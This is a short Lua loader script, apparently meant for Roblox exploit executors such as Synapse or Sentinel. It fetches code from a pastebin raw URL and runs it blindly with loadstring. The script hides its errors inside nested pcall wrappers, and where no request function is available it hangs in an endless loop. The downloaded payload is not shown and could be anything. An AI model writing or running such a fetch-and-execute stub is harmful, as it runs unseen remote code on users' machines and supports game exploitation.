
pcall(function()
pcall(function()
pcall(function()
pcall(function()
if syn then getgenv().http_request=syn.request elseif SENTINEL_LOADED then getgenv().http_request=request end
if http_request ~= nil then
  content = http_request({Url="https://pastebin.com/raw/esydcPrn", Method="GET"}).Body
else
while true do end
end
loadstring(content)()
end)
end)
end)
end)
